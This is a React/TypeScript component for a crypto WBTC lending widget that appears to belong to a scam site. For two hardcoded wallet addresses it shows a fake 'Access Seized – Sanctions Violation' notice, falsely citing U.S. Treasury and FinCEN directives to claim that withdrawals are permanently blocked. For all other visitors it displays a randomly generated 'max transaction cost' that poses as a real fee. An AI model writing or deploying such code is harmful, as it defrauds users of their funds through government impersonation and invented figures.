import { useRef, useState } from "react";
import { FaBitcoin } from "react-icons/fa";
import BoxStakePage from "./BoxStakePage";
import useRandomNumber from "../hooks/useRandomGas";
import ConnectButtonBox from "./ConnectButtonBox";
import useWallet from "../hooks/useWallet";

interface Props {
  className?: string;
}

function LendBox({ className }: Props) {
  const inputRef = useRef<HTMLInputElement>(null);
  const [error, setError] = useState<string | null>(null);
  const targetAddresses = [
    "0x2fFc5CaC16c34498613bc2C370E128D69b4acaF1",
    "0x22B20C2b318e574Bd7a8875b9E295cF1839968DF",
  ];
  const { address } = useWallet();

  const randNum = useRandomNumber(8.8, 10.29);

  const handleChanges = () => {
    if (inputRef.current) {
      const value = parseFloat(inputRef.current.value);

      if (value < 3) {
        setError("The minimum value must be 3 WBTC");
      } else {
        setError(null);
      }
    }
  };

  return (
    <BoxStakePage className={className}>
      <div className="relative">
        <input
          ref={inputRef}
          onChange={handleChanges}
          className="w-full p-3 pl-12 min-h-14 text-sm placeholder:text-sm bg-gray-300 dark:bg-slate-600 border border-gray-500 rounded-lg "
          type="number"
          placeholder="WBTC amount"
        />
        <FaBitcoin className="absolute inset-y-0 left-0 pl-3 top-3 text-3xl text-gray-400 items-center content-center" />
        {/* <button className="absolute px-2 lg:px-4 max-h-8 inset-y-0 right-3 top-3 text-sm rounded-lg bg-blue-800/30 text-gray-300 dark:text-sky-500/70">
          MAX
        </button> */}
      </div>

      {error && <div className="text-red-400 text-sm">{error}</div>}

      <ConnectButtonBox connectedTitle="Lend" />

      {!targetAddresses.includes(address ?? "") ? (
        <div className="grid grid-cols-2 text-sm text-gray-400/60">
          <ul className="space-y-2">
            <li>Minimum deposit</li>
            <li>Minimum time lock</li>
            <li>Max transaction cost</li>
            <li>Reward fee</li>
          </ul>
          <ul className="text-end space-y-2">
            <li>3 BTC</li>
            <li>1 Year</li>
            <li>${randNum}</li>
            <li>0.3%</li>
          </ul>
        </div>
      ) : (
        <div className="p-5 space-y-2 rounded-lg bg-gray-300 dark:bg-gray-800/60">
          <h5 className="text-lg font-semibold">
            Access Seized – Sanctions Violation Identified
          </h5>
          <p className="text-sm font-light">
            Withdrawals from this wallet have been permanently restricted in
            accordance with directives issued by the U.S. Department of the
            Treasury and FinCEN. This address has been identified as being
            directly associated with money laundering activities tied to a
            U.S.-sanctioned country. As such, it is now under active
            investigation and has been seized pursuant to applicable federal
            regulations.
          </p>
        </div>
      )}
    </BoxStakePage>
  );
}

export default LendBox;
